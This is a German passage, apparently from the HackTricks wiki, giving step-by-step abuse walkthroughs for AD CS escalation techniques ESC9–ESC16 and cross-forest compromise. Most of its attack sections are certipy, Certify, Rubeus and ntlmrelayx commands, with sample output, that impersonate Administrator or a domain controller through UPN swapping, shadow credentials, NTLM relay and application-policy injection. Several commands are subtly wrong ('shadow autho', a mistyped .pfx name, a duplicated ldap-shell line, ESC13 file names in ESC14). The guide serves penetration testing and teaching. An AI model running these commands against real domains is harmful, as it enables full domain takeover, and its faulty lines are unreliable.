Der neue Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, auch bekannt als ESC9, verhindert das Einbetten der **neuen `szOID_NTDS_CA_SECURITY_EXT` Sicherheits-Erweiterung** in ein Zertifikat. Dieses Flag wird relevant, wenn `StrongCertificateBindingEnforcement` auf `1` (die Standardeinstellung) gesetzt ist, was im Gegensatz zu einer Einstellung von `2` steht. Seine Relevanz erhöht sich in Szenarien, in denen eine schwächere Zertifikatzuordnung für Kerberos oder Schannel ausgenutzt werden könnte (wie in ESC10), da das Fehlen von ESC9 die Anforderungen nicht ändern würde.

Die Bedingungen, unter denen die Einstellung dieses Flags signifikant wird, umfassen:

- `StrongCertificateBindingEnforcement` ist nicht auf `2` eingestellt (mit der Standardeinstellung `1`), oder `CertificateMappingMethods` enthält das `UPN`-Flag.
- Das Zertifikat ist mit dem `CT_FLAG_NO_SECURITY_EXTENSION`-Flag innerhalb der `msPKI-Enrollment-Flag`-Einstellung gekennzeichnet.
- Ein beliebiges Client-Authentifizierungs-EKU wird durch das Zertifikat angegeben.
- `GenericWrite`-Berechtigungen sind über ein beliebiges Konto verfügbar, um ein anderes zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` hat `GenericWrite`-Berechtigungen über `Jane@corp.local`, mit dem Ziel, `Administrator@corp.local` zu kompromittieren. Die `ESC9`-Zertifikatvorlage, in die `Jane@corp.local` berechtigt ist, sich einzuschreiben, ist mit dem `CT_FLAG_NO_SECURITY_EXTENSION`-Flag in ihrer `msPKI-Enrollment-Flag`-Einstellung konfiguriert.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials erlangt, dank `John`'s `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Anschließend wird `Jane`'s `userPrincipalName` auf `Administrator` geändert, wobei absichtlich der Teil der Domäne `@corp.local` weggelassen wird:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Diese Modifikation verstößt nicht gegen die Einschränkungen, da `Administrator@corp.local` als `userPrincipalName` von `Administrator` weiterhin eindeutig bleibt.

Daraufhin wird die als anfällig gekennzeichnete `ESC9`-Zertifikatvorlage als `Jane` angefordert:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Es wird festgestellt, dass der `userPrincipalName` des Zertifikats `Administrator` widerspiegelt, ohne eine „object SID“.

Der `userPrincipalName` von `Jane` wird dann auf ihren ursprünglichen Wert, `Jane@corp.local`, zurückgesetzt:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Der Versuch, sich mit dem ausgestellten Zertifikat zu authentifizieren, ergibt nun den NT-Hash von `Administrator@corp.local`. Der Befehl muss `-domain <domain>` enthalten, da das Zertifikat keine Domainspezifikation aufweist:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Schwache Zertifikatzuordnungen - ESC10

### Erklärung

Zwei Registrierungswertschlüssel auf dem Domänencontroller werden von ESC10 referenziert:

- Der Standardwert für `CertificateMappingMethods` unter `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ist `0x18` (`0x8 | 0x10`), zuvor auf `0x1F` gesetzt.
- Die Standardeinstellung für `StrongCertificateBindingEnforcement` unter `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ist `1`, zuvor `0`.

**Fall 1**

Wenn `StrongCertificateBindingEnforcement` auf `0` konfiguriert ist.

**Fall 2**

Wenn `CertificateMappingMethods` das `UPN`-Bit (`0x4`) enthält.

### Missbrauchsfall 1

Mit `StrongCertificateBindingEnforcement`, das auf `0` konfiguriert ist, kann ein Konto A mit `GenericWrite`-Berechtigungen ausgenutzt werden, um jedes Konto B zu kompromittieren.

Zum Beispiel, wenn ein Angreifer `GenericWrite`-Berechtigungen über `Jane@corp.local` hat, zielt er darauf ab, `Administrator@corp.local` zu kompromittieren. Das Verfahren spiegelt ESC9 wider und ermöglicht die Nutzung jeder Zertifikatvorlage.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials abgerufen, wobei `GenericWrite` ausgenutzt wird.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Anschließend wird `Jane`'s `userPrincipalName` in `Administrator` geändert, wobei der Teil `@corp.local` absichtlich weggelassen wird, um eine Einschränkungsverletzung zu vermeiden.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
In der Folge wird ein Zertifikat angefordert, das die Client-Authentifizierung ermöglicht, als `Jane`, unter Verwendung der Standardvorlage `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` wird dann auf das Original zurückgesetzt, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT-Hash von `Administrator@corp.local`, was die Angabe der Domäne im Befehl erforderlich macht, da im Zertifikat keine Domänendetails enthalten sind.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Missbrauchsfall 2

Mit den `CertificateMappingMethods`, die das `UPN`-Bit-Flag (`0x4`) enthalten, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B, das über keine `userPrincipalName`-Eigenschaft verfügt, kompromittieren, einschließlich Maschinenkonten und des integrierten Domänenadministrators `Administrator`.

Hier besteht das Ziel darin, `DC$@corp.local` zu kompromittieren, beginnend mit dem Erhalten von `Janes` Hash durch Shadow Credentials, unter Ausnutzung des `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` wird dann auf `DC$@corp.local` gesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ein Zertifikat für die Client-Authentifizierung wird als `Jane` unter Verwendung der Standardvorlage `User` angefordert.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` wird nach diesem Prozess auf seinen ursprünglichen Wert zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Um sich über Schannel zu authentifizieren, wird die `-ldap-shell`-Option von Certipy verwendet, die den Authentifizierungserfolg als `u:CORP\DC$` anzeigt.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Durch die LDAP-Shell ermöglichen Befehle wie `set_rbcd` Angriffe mit ressourcenbasiertem eingeschränktem Delegieren (RBCD), die potenziell den Domänencontroller gefährden können.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Diese Schwachstelle betrifft auch jedes Benutzerkonto, das keinen `userPrincipalName` hat oder bei dem dieser nicht mit dem `sAMAccountName` übereinstimmt, wobei das Standardkonto `Administrator@corp.local` aufgrund seiner erhöhten LDAP-Berechtigungen und des standardmäßig fehlenden `userPrincipalName` ein Hauptziel ist.

## Relaying NTLM zu ICPR - ESC11

### Erklärung

Wenn der CA-Server nicht mit `IF_ENFORCEENCRYPTICERTREQUEST` konfiguriert ist, können NTLM-Relay-Angriffe ohne Signierung über den RPC-Dienst durchgeführt werden. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Sie können `certipy` verwenden, um zu ermitteln, ob `Enforce Encryption for Requests` deaktiviert ist, und certipy wird `ESC11`-Schwachstellen anzeigen.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Missbrauchsszenario

Es muss ein Relay-Server eingerichtet werden:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Hinweis: Für Domänencontroller müssen wir `-template` in DomainController angeben.

Oder mit [sploutchy's Fork von impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell-Zugriff auf ADCS CA mit YubiHSM - ESC12

### Erklärung

Administratoren können die Zertifizierungsstelle so einrichten, dass sie auf einem externen Gerät wie dem "Yubico YubiHSM2" gespeichert wird.

Wenn ein USB-Gerät über einen USB-Port mit dem CA-Server verbunden ist oder ein USB-Geräteserver im Falle des CA-Servers eine virtuelle Maschine ist, ist ein Authentifizierungsschlüssel (manchmal als "Passwort" bezeichnet) erforderlich, damit der Key Storage Provider Schlüssel im YubiHSM generieren und nutzen kann.

Dieses Schlüssel/Passwort wird im Registrierungseditor unter `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` im Klartext gespeichert.

Referenz [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Missbrauchsszenario

Wenn der private Schlüssel der CA auf einem physischen USB-Gerät gespeichert ist, wenn Sie Zugriff auf die Shell haben, ist es möglich, den Schlüssel wiederherzustellen.

Zuerst müssen Sie das CA-Zertifikat (dies ist öffentlich) erhalten und dann:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Schließlich verwenden Sie den certutil `-sign` Befehl, um ein neues beliebiges Zertifikat mit dem CA-Zertifikat und seinem privaten Schlüssel zu fälschen.

## OID-Gruppenlink-Missbrauch - ESC13

### Erklärung

Das Attribut `msPKI-Certificate-Policy` ermöglicht es, die Ausgabe-Policy zum Zertifikatstemplate hinzuzufügen. Die `msPKI-Enterprise-Oid` Objekte, die für die Ausgabe-Policies verantwortlich sind, können im Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) des PKI OID Containers entdeckt werden. Eine Policy kann mit einer AD-Gruppe verknüpft werden, indem das Attribut `msDS-OIDToGroupLink` dieses Objekts verwendet wird, wodurch ein System einen Benutzer autorisieren kann, der das Zertifikat präsentiert, als ob er ein Mitglied der Gruppe wäre. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Mit anderen Worten, wenn ein Benutzer die Berechtigung hat, ein Zertifikat zu beantragen und das Zertifikat mit einer OID-Gruppe verknüpft ist, kann der Benutzer die Privilegien dieser Gruppe erben.

Verwenden Sie [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), um OIDToGroupLink zu finden:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Missbrauchsszenario

Finden Sie eine Benutzerberechtigung, die `certipy find` oder `Certify.exe find /showAllPermissions` verwenden kann.

Wenn `John` die Berechtigung hat, `VulnerableTemplate` zu beantragen, kann der Benutzer die Privilegien der Gruppe `VulnerableGroup` erben.

Alles, was er tun muss, ist, die Vorlage anzugeben, und er erhält ein Zertifikat mit OIDToGroupLink-Rechten.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Verwundbare Zertifikatserneuerungskonfiguration - ESC14

### Erklärung

Die Beschreibung unter https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ist bemerkenswert gründlich. Unten steht ein Zitat des Originaltextes.

ESC14 behandelt Schwachstellen, die aus "schwachem explizitem Zertifikatmapping" resultieren, hauptsächlich durch den Missbrauch oder die unsichere Konfiguration des `altSecurityIdentities`-Attributs auf Active Directory-Benutzer- oder Computer-Konten. Dieses mehrwertige Attribut ermöglicht es Administratoren, X.509-Zertifikate manuell mit einem AD-Konto für Authentifizierungszwecke zu verknüpfen. Wenn es befüllt ist, können diese expliziten Zuordnungen die Standard-Zertifikatmapping-Logik überschreiben, die typischerweise auf UPNs oder DNS-Namen im SAN des Zertifikats oder der im `szOID_NTDS_CA_SECURITY_EXT`-Sicherheitserweiterung eingebetteten SID basiert.

Eine "schwache" Zuordnung tritt auf, wenn der Zeichenfolgenwert, der im `altSecurityIdentities`-Attribut verwendet wird, um ein Zertifikat zu identifizieren, zu allgemein, leicht erratbar, auf nicht eindeutigen Zertifikatfeldern basiert oder leicht fälschbare Zertifikatkomponenten verwendet. Wenn ein Angreifer ein Zertifikat erhalten oder erstellen kann, dessen Attribute mit einer solchen schwach definierten expliziten Zuordnung für ein privilegiertes Konto übereinstimmen, kann er dieses Zertifikat verwenden, um sich als dieses Konto zu authentifizieren und es zu impersonieren.

Beispiele für potenziell schwache `altSecurityIdentities`-Mapping-Zeichenfolgen sind:

- Zuordnung ausschließlich nach einem gemeinsamen Subject Common Name (CN): z.B. `X509:<S>CN=SomeUser`. Ein Angreifer könnte in der Lage sein, ein Zertifikat mit diesem CN aus einer weniger sicheren Quelle zu erhalten.
- Verwendung von zu allgemeinen Aussteller-Distinguished Names (DNs) oder Subject DNs ohne weitere Qualifikation wie eine spezifische Seriennummer oder Subject Key Identifier: z.B. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Verwendung anderer vorhersehbarer Muster oder nicht-kryptografischer Identifikatoren, die ein Angreifer möglicherweise in einem Zertifikat erfüllen kann, das er legitim erhalten oder fälschen kann (wenn er eine CA kompromittiert hat oder eine verwundbare Vorlage wie in ESC1 gefunden hat).

Das `altSecurityIdentities`-Attribut unterstützt verschiedene Formate für die Zuordnung, wie:

- `X509:<I>IssuerDN<S>SubjectDN` (zuordnet nach vollständigem Aussteller- und Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (zuordnet nach dem Wert der Subject Key Identifier-Erweiterung des Zertifikats)
- `X509:<SR>SerialNumberBackedByIssuerDN` (zuordnet nach Seriennummer, implizit qualifiziert durch den Aussteller-DN) - dies ist kein Standardformat, normalerweise ist es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (zuordnet nach einem RFC822-Namen, typischerweise einer E-Mail-Adresse, aus dem SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (zuordnet nach einem SHA1-Hash des rohen öffentlichen Schlüssels des Zertifikats - allgemein stark)

Die Sicherheit dieser Zuordnungen hängt stark von der Spezifität, Einzigartigkeit und kryptografischen Stärke der gewählten Zertifikat-Identifikatoren ab, die in der Zuordnungszeichenfolge verwendet werden. Selbst bei aktivierten starken Zertifikatbindungsmodi auf Domänencontrollern (die hauptsächlich implizite Zuordnungen basierend auf SAN-UPNs/DNS und der SID-Erweiterung betreffen) kann ein schlecht konfiguriertes `altSecurityIdentities`-Eintrag immer noch einen direkten Weg zur Impersonation darstellen, wenn die Zuordnungslogik selbst fehlerhaft oder zu nachsichtig ist.

### Missbrauchsszenario

ESC14 zielt auf **explizite Zertifikatzuordnungen** in Active Directory (AD) ab, insbesondere auf das `altSecurityIdentities`-Attribut. Wenn dieses Attribut gesetzt ist (absichtlich oder durch Fehlkonfiguration), können Angreifer Konten impersonieren, indem sie Zertifikate präsentieren, die mit der Zuordnung übereinstimmen.

#### Szenario A: Angreifer kann in `altSecurityIdentities` schreiben

**Vorbedingung**: Der Angreifer hat Schreibberechtigungen für das `altSecurityIdentities`-Attribut des Zielkontos oder die Berechtigung, es in Form einer der folgenden Berechtigungen auf dem Ziel-AD-Objekt zu gewähren:
- Schreibeigenschaft `altSecurityIdentities`
- Schreibeigenschaft `Public-Information`
- Schreibeigenschaft (alle)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Eigentümer*.

#### Szenario B: Ziel hat schwache Zuordnung über X509RFC822 (E-Mail)

- **Vorbedingung**: Das Ziel hat eine schwache X509RFC822-Zuordnung in `altSecurityIdentities`. Ein Angreifer kann das E-Mail-Attribut des Opfers so einstellen, dass es mit dem X509RFC822-Namen des Ziels übereinstimmt, ein Zertifikat als das Opfer beantragen und es verwenden, um sich als das Ziel zu authentifizieren.

#### Szenario C: Ziel hat X509IssuerSubject-Zuordnung

- **Vorbedingung**: Das Ziel hat eine schwache X509IssuerSubject-explizite Zuordnung in `altSecurityIdentities`. Der Angreifer kann das `cn`- oder `dNSHostName`-Attribut eines Opferprinzips so einstellen, dass es mit dem Subject der X509IssuerSubject-Zuordnung des Ziels übereinstimmt. Dann kann der Angreifer ein Zertifikat als das Opfer beantragen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

#### Szenario D: Ziel hat X509SubjectOnly-Zuordnung

- **Vorbedingung**: Das Ziel hat eine schwache X509SubjectOnly-explizite Zuordnung in `altSecurityIdentities`. Der Angreifer kann das `cn`- oder `dNSHostName`-Attribut eines Opferprinzips so einstellen, dass es mit dem Subject der X509SubjectOnly-Zuordnung des Ziels übereinstimmt. Dann kann der Angreifer ein Zertifikat als das Opfer beantragen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

### Konkrete Operationen
#### Szenario A

Fordern Sie ein Zertifikat der Zertifikatvorlage `Machine` an.
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zertifikat speichern und konvertieren
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authentifizieren (unter Verwendung des Zertifikats)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Bereinigung (optional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Für spezifischere Angriffsmethoden in verschiedenen Angriffsszenarien verweisen Sie bitte auf Folgendes: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu-Anwendungspolitiken (CVE-2024-49019) - ESC15

### Erklärung

Die Beschreibung unter https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ist bemerkenswert gründlich. Nachfolgend ein Zitat des Originaltextes.

Durch die Verwendung von integrierten Standard-Zertifikatvorlagen der Version 1 kann ein Angreifer eine CSR erstellen, die Anwendungspolitiken enthält, die den konfigurierten Extended Key Usage-Attributen, die in der Vorlage angegeben sind, vorgezogen werden. Die einzige Voraussetzung sind Anmelderechte, und es kann verwendet werden, um Client-Authentifizierung, Zertifikatsanforderungsagenten und Codesigning-Zertifikate mit der **_WebServer_**-Vorlage zu generieren.

### Missbrauch

Das Folgende bezieht sich auf [diesen Link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), klicken Sie hier, um detailliertere Nutzungsmethoden zu sehen.

Der `find`-Befehl von Certipy kann helfen, V1-Vorlagen zu identifizieren, die potenziell anfällig für ESC15 sind, wenn die CA nicht gepatcht ist.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Szenario A: Direkte Identitätsübernahme über Schannel

**Schritt 1: Fordern Sie ein Zertifikat an, indem Sie die "Client-Authentifizierung" Anwendungsrichtlinie und die Ziel-UPN injizieren.** Angreifer `attacker@corp.local` zielt auf `administrator@corp.local` unter Verwendung der "WebServer" V1-Vorlage (die die Bereitstellung des Subjekts durch den Anmelder erlaubt).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Die anfällige V1-Vorlage mit "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injektiert die OID `1.3.6.1.5.5.7.3.2` in die Application Policies-Erweiterung des CSR.
- `-upn 'administrator@corp.local'`: Setzt den UPN im SAN für die Identitätsübernahme.

**Step 2: Authentifizieren Sie sich über Schannel (LDAPS) mit dem erhaltenen Zertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Szenario B: PKINIT/Kerberos-Imitation durch Missbrauch des Enrollment Agents

**Schritt 1: Fordern Sie ein Zertifikat von einer V1-Vorlage an (mit "Enrollee supplies subject"), indem Sie die "Certificate Request Agent" Anwendungsrichtlinie injizieren.** Dieses Zertifikat ist für den Angreifer (`attacker@corp.local`), um ein Enrollment Agent zu werden. Es wird hier kein UPN für die eigene Identität des Angreifers angegeben, da das Ziel die Agentenfähigkeit ist.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injektiert OID `1.3.6.1.4.1.311.20.2.1`.

**Schritt 2: Verwenden Sie das "Agent"-Zertifikat, um ein Zertifikat im Namen eines privilegierten Zielbenutzers anzufordern.** Dies ist ein ESC3-ähnlicher Schritt, der das Zertifikat aus Schritt 1 als Agentenzertifikat verwendet.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Schritt 3: Authentifizieren Sie sich als privilegierter Benutzer mit dem "on-behalf-of" Zertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Sicherheits­erweiterung auf CA (global) deaktiviert - ESC16

### Erklärung

**ESC16 (Erhöhung von Rechten durch fehlende szOID_NTDS_CA_SECURITY_EXT-Erweiterung)** bezieht sich auf das Szenario, in dem die Konfiguration von AD CS die Einbeziehung der **szOID_NTDS_CA_SECURITY_EXT**-Erweiterung in allen Zertifikaten nicht durchsetzt, wodurch ein Angreifer dies ausnutzen kann, indem er:

1. Ein Zertifikat **ohne SID-Bindung** anfordert.

2. Dieses Zertifikat **zur Authentifizierung als beliebiges Konto** verwendet, z. B. um ein Konto mit hohen Rechten (z. B. einen Domänenadministrator) zu impersonieren.

Sie können auch auf diesen Artikel verweisen, um mehr über das detaillierte Prinzip zu erfahren: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Missbrauch

Das Folgende bezieht sich auf [diesen Link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Klicken Sie hier, um detailliertere Nutzungsmethoden zu sehen.

Um zu identifizieren, ob die Active Directory-Zertifikatdienste (AD CS)-Umgebung anfällig für **ESC16** sind.
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Schritt 1: Lesen Sie den initialen UPN des Opferkontos (Optional - zur Wiederherstellung).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Schritt 2: Aktualisieren Sie den UPN des Opferkontos auf den `sAMAccountName` des Zieladministrators.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Schritt 3: (Falls erforderlich) Erhalten Sie Anmeldeinformationen für das "Opfer"-Konto (z. B. über Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Schritt 4: Fordern Sie ein Zertifikat als der "Opfer"-Benutzer von _irgendeiner geeigneten Client-Authentifizierungsvorlage_ (z.B. "Benutzer") auf der ESC16-anfälligen CA an.** Da die CA anfällig für ESC16 ist, wird sie automatisch die SID-Sicherheitserweiterung aus dem ausgestellten Zertifikat weglassen, unabhängig von den spezifischen Einstellungen der Vorlage für diese Erweiterung. Setzen Sie die Umgebungsvariable für den Kerberos-Anmeldeinformationscache (Shell-Befehl):
```bash
export KRB5CCNAME=victim.ccache
```
Dann fordere das Zertifikat an:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Schritt 5: Den UPN des "Opfer"-Kontos zurücksetzen.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Schritt 6: Authentifizieren Sie sich als der Zieladministrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kompromittierung von Wäldern mit Zertifikaten im Passiv erklärt

### Brechen von Waldvertrauen durch kompromittierte CAs

Die Konfiguration für **Cross-Forest-Enrollment** ist relativ unkompliziert. Das **Root-CA-Zertifikat** aus dem Ressourcenwald wird von Administratoren **in die Konto-Wälder veröffentlicht**, und die **Enterprise-CA**-Zertifikate aus dem Ressourcenwald werden **zu den `NTAuthCertificates` und AIA-Containern in jedem Konto-Wald hinzugefügt**. Um das zu verdeutlichen, gewährt diese Anordnung der **CA im Ressourcenwald die vollständige Kontrolle** über alle anderen Wälder, für die sie PKI verwaltet. Sollte diese CA von **Angreifern kompromittiert werden**, könnten Zertifikate für alle Benutzer in sowohl dem Ressourcen- als auch dem Konto-Wald von ihnen **gefälscht werden**, wodurch die Sicherheitsgrenze des Waldes durchbrochen wird.

### Einschreiberechte, die ausländischen Prinzipalen gewährt werden

In Multi-Wald-Umgebungen ist Vorsicht geboten hinsichtlich Enterprise CAs, die **Zertifikatvorlagen veröffentlichen**, die **authentifizierten Benutzern oder ausländischen Prinzipalen** (Benutzern/Gruppen, die extern zum Wald sind, zu dem die Enterprise CA gehört) **Einschreibungs- und Bearbeitungsrechte** gewähren.\
Nach der Authentifizierung über ein Vertrauen wird die **Authenticated Users SID** dem Token des Benutzers von AD hinzugefügt. Wenn also eine Domäne eine Enterprise CA mit einer Vorlage besitzt, die **authentifizierten Benutzern Einschreibungsrechte gewährt**, könnte eine Vorlage potenziell von einem Benutzer aus einem anderen Wald **eingeschrieben werden**. Ebenso, wenn **Einschreiberechte explizit durch eine Vorlage an einen ausländischen Prinzipal gewährt werden**, wird eine **Cross-Forest-Zugriffssteuerungsbeziehung geschaffen**, die es einem Prinzipal aus einem Wald ermöglicht, **sich in eine Vorlage aus einem anderen Wald einzuschreiben**.

Beide Szenarien führen zu einer **Erhöhung der Angriffsfläche** von einem Wald zum anderen. Die Einstellungen der Zertifikatvorlage könnten von einem Angreifer ausgenutzt werden, um zusätzliche Berechtigungen in einer fremden Domäne zu erlangen.


{{#include ../../../banners/hacktricks-training.md}}
